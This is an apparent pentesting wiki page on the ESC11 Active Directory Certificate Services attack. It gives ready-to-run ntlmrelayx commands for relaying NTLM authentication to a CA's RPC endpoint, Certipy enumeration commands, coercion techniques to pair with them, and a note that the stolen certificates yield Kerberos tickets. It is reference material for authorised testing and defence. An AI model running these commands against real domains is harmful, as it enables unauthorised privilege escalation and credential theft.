# RPC endpoint (ESC11)

## 1. Relay servers setup

From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket)'s [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) can be used to conduct the ESC11 escalation scenario.
```bash
ntlmrelayx -t rpc://$PKI.domain.local -rpc-mode ICPR -icpr-ca-name $CA_NAME -smb2support --template "Template name"
```

> [!TIP]
> The certificate template flag (i.e. `--template`) can either be left blank (defaults to Machine or User whether relayed account name ends with `$`) or chosen among the certificate templates that fill the requirements.
> 
> For instance, if the relayed principal is a domain controller, the `DomainController` template must be specified.

[Certipy](https://github.com/ly4k/Certipy) can be used to enumerate information regarding the certificate templates (EKUs allowing for authentication, allowing low-priv users to enroll, etc.) and identify a vulnerable RPC endpoint.
```bash
# find ESC11-vulnerable CAs
certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -stdout | grep -B20 ESC11
# find and look through enabled templates for ones that could be used for authentication
certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -stdout -enabled
```

> [!TIP]
> By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.

## 2. Authentication coercion

Just like any other NTLM relay attack, once the relay servers are running and waiting for incoming NTLM authentications, authentication coercion techniques can be used (e.g. PrinterBug, PetitPotam, PrivExchange) to force accounts/machines to authenticate to the relay servers.

## 3. Loot

Once incoming NTLM authentications are relayed and authenticated sessions abused, base64-encoded PFX certificates will be obtained and usable with Pass-the-Certificate to obtain a TGT and authenticate.

_From Windows systems no tool permits to identify and exploit the ESC11 vulnerability. Look at the UNIX-like tab to perform the exploitation._
